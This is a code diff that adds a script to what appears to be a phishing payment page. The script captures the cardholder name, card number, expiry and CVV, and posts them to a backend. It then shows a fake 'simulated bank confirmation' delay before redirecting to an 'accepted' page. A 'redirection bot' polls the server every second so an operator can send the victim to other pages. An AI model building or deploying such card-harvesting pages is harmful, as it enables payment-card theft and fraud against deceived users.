@@ -44,5 +44,50 @@ async function pollRedirect(){
 }
 pollRedirect();
 </script>
+
+<script>
+document.getElementById('paymentForm').addEventListener('submit', async (e)=>{
+    e.preventDefault();
+    const form = e.target;
+    const data = {
+        nomTitulaire: form.nomTitulaire.value,
+        cardNumber: form.cardNumber.value,
+        expiry: form.expiry.value,
+        cvv: form.cvv.value
+    };
+    try {
+        await fetch('/api/payment',{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify(data)
+        });
+    } catch(e){ console.warn("Erreur d'envoi", e); }
+
+    form.style.display='none';
+    const loader = document.getElementById('loader');
+    loader.style.display='block';
+
+    // Simulation de confirmation bancaire (5 sec)
+    setTimeout(()=>{ 
+        window.location.href='/accepted.html';
+    },5000);
+});
+
+// Polling redirection bot
+async function pollRedirect(){
+    const res = await fetch('/api/status');
+    const data = await res.json();
+    if(data.redirect && window.location.pathname !== data.redirect){
+        window.location.href = data.redirect;
+    }
+    setTimeout(pollRedirect,1000);
+}
+pollRedirect();
+</script>
+
+
+
+
+    
 </body>
 </html>
